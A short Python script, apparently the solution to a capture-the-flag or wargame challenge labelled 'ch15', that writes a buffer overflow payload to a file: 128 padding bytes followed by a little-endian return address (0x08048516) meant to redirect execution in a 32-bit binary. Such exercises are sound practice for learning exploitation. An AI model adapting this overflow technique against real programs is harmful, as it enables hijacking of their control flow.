def main():
    exe_input = b'a' * 128 + int.to_bytes(0x08048516, 4, 'little') + b'\x00'
    
    with open('ch15_input', 'wb') as destfile:
        destfile.write(exe_input)
        

if __name__ == '__main__':
    main()

